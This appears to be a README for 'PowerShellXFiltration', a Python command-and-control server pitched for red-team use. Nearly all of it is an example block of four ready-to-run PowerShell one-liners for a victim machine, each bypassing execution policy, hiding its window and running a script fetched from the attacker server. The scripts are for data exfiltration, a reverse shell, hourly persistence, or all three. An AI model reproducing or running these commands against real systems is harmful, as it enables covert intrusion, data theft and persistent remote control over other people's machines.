## PowerShellXFiltration
A Python web server to execute several actions on a Windows system, acting like a C2.
Useful for redteam.

### Example
1. Change the settings in `config.py`.
2. Run:
```
ATTACKER> python3 server.py

#For data exfiltration
VICTIM> powershell -ep bypass -windowstyle hidden -c "$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("http://<SERVER-IP>:<SERVER-PORT>/client_exf");"

#For reverse-shell
VICTIM> powershell -ep bypass -windowstyle hidden -c "$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("http://<SERVER-IP>:<SERVER-PORT>/client_rvs");"

#For running a persistent command (by default runs every hour for 6 days, but can be changed in `client_pers.ps1`)
VICTIM> powershell -ep bypass -windowstyle hidden -c "$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("http://<SERVER-IP>:<SERVER-PORT>/client_pers");"

#For running data exfiltration + reverse-shell
VICTIM> powershell -ep bypass -windowstyle hidden -c "$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("http://<SERVER-IP>:<SERVER-PORT>/run_all");"
```
